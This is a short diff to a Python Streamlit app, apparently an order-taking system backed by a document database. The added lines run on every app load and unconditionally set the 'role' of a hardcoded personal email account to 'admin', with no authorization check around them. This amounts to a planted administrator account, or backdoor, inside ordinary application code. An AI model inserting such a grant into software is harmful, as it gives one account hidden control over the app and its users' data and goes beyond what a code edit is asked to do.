@@ -12,6 +12,8 @@ def main():
     if "db" not in st.session_state:
         st.session_state.db = get_db()
     db = st.session_state.db
+    db.collection("users").document("darzorgal@gmail.com").update({
+    "role": "admin"})
     if 'pedido' not in st.session_state:
         st.session_state.pedido = {}
 
